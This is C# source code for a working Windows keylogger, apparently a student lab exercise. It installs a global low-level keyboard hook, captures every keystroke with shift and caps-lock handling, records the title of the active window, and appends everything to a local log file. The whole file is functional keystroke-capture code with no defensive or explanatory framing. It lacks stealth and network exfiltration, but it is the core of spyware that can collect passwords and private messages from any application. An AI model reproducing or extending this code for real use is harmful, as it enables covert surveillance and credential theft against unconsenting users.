using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Windows.Forms;
using System.IO;

namespace lab4
{
    class Program
    {
        private static int WH_KEYBOARD_LL = 13;
        private static int WM_KEYDOWN = 0x0100;
        private static int WM_KEYUP = 0x0101;
        private static IntPtr hook = IntPtr.Zero;
        private static LowLevelKeyboardProc llkProcedure = HookCallback;
        public static string windowsTitle = GetActiveWindowTitle();
        public static bool checkWrite = false;
        public static bool shift = false;
        public static bool caps = false;

        static void Main(string[] args)
        {
            File.Delete(@"D:\2sem\C#\Lab4\lab4.1\mylog.txt");
            hook = SetHook(llkProcedure);
            Application.Run();
            UnhookWindowsHookEx(hook);
        }

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            bool isKeyUp = false;
            int vkCode = Marshal.ReadInt32(lParam);
            if (nCode >= 0 && (wParam == (IntPtr)WM_KEYDOWN || (wParam == (IntPtr)WM_KEYUP && ((Keys)vkCode == Keys.Shift 
                || ((Keys)vkCode) == Keys.LShiftKey || ((Keys)vkCode) == Keys.RShiftKey))))
            {
                if(wParam == (IntPtr)WM_KEYUP)
                {
                    isKeyUp = true;
                }

                if (windowsTitle != GetActiveWindowTitle())
                {
                    windowsTitle = GetActiveWindowTitle();
                    checkWrite = false;
                }                

                if (((Keys)vkCode) == Keys.Shift || ((Keys)vkCode) == Keys.LShiftKey || ((Keys)vkCode) == Keys.RShiftKey)
                {
                    if (shift == false)
                    {
                        shift = true;
                    }
                    else
                    {
                        shift = false;
                    }
                }
                if(shift == true && (Keys)vkCode == Keys.CapsLock)
                {
                    shift = false;
                }
                if((Keys)vkCode == Keys.CapsLock)
                {
                    if (caps == false)
                    {
                        caps = true;
                    }
                    else
                    {
                        caps = false;
                    }
                }

                bool isBig = shift | caps;
                if(shift == true && caps == true)
                {
                    isBig = false;
                }

                if (((Keys)vkCode).ToString() == "OemPeriod")
                {
                    ShowWindowsTitle();
                    Console.Out.Write(".");
                    StreamWriter output = new StreamWriter(@"D:\2sem\C#\Lab4\lab4.1\mylog.txt", true);
                    output.Write(".");
                    output.Close();
                }
                else if (((Keys)vkCode).ToString() == "Oemcomma")
                {
                    ShowWindowsTitle();
                    Console.Out.Write(",");
                    StreamWriter output = new StreamWriter(@"D:\2sem\C#\Lab4\lab4.1\mylog.txt", true);
                    output.Write(",");
                    output.Close();
                }
                else if (((Keys)vkCode).ToString() == "Space")
                {
                    ShowWindowsTitle();
                    Console.Out.Write(" ");
                    StreamWriter output = new StreamWriter(@"D:\2sem\C#\Lab4\lab4.1\mylog.txt", true);
                    output.Write(" ");
                    output.Close();
                }
                else
                {
                    ShowWindowsTitle();
                    if (!isKeyUp)
                    {
                        string outputString = ((Keys)vkCode).ToString();
                        if (isBig == false)
                        {
                            outputString = ((Keys)vkCode).ToString().ToLower();
                        }
                        Console.Out.Write(outputString);
                        StreamWriter output = new StreamWriter(@"D:\2sem\C#\Lab4\lab4.1\mylog.txt", true);
                        output.Write(outputString);
                        output.Close();
                    }
                }
            }
            return CallNextHookEx(IntPtr.Zero, nCode, wParam, lParam);
        }

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            Process currentProcess = Process.GetCurrentProcess();
            ProcessModule currentModule = currentProcess.MainModule;
            String moduleName = currentModule.ModuleName;
            IntPtr moduleHandle = GetModuleHandle(moduleName);
            return SetWindowsHookEx(WH_KEYBOARD_LL, llkProcedure, moduleHandle, 0);
        }

        [DllImport("user32.dll")]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll")]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll")]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetModuleHandle(String lpModuleName);

        [DllImport("user32.dll")]
        public static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll")]
        public static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);

        private static string GetActiveWindowTitle()
        {
            var buff = new StringBuilder(256);
            var handle = GetForegroundWindow();

            if (GetWindowText(handle, buff, 256) > 0)
            {
                return buff.ToString();
            }
            return null;
        }

        public static void ShowWindowsTitle()
        {
            if (checkWrite == false)
            {
                Console.Out.Write($"[{windowsTitle}]");
                checkWrite = true;
                StreamWriter output = new StreamWriter(@"D:\2sem\C#\Lab4\lab4.1\mylog.txt", true);
                output.Write($"[{windowsTitle}]");
                output.Close();
            }
        }
    }
}